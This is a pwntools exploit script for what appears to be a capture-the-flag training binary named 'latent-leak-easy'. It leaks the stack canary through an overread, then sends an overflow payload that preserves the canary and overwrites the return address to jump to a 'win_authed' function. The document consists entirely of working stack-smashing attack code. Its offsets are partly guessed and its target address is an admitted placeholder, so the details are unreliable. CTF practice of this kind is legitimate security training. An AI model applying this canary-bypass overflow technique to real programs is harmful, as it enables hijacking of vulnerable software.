from pwn import *

p = process('/challenge/latent-leak-easy')  # or whatever the challenge name is

# First, leak the canary using the recursion
p.recvuntil('Payload size:')
p.sendline(b'329')  # Size to reach just before canary

# Send payload that stops right before canary
payload = b'A' * 328  # Up to but not including canary
p.sendline(payload)

# The program should show us what's in memory (including canary)
output = p.recvuntil('This challenge')
print(output)

# Extract canary from the output
# Canary is at bytes 329-336 in the output
canary = output[329:337]  # 8 bytes for canary
print(f"Leaked canary: {canary.hex()}")

# Now exploit with the canary
p.recvuntil('Payload size:')
p.sendline(b'352')  # 328 (to canary) + 8 (canary) + 8 (saved rbp) + 8 (ret addr)

# Build payload with correct canary
payload = b'A' * 328  # Padding to canary
payload += canary      # Preserve canary
payload += b'A' * 8    # Padding to return address  
payload += p64(0x1eef)  # You need the real win_authed address here

p.recvuntil('Send your payload')
p.sendline(payload)

p.interactive()
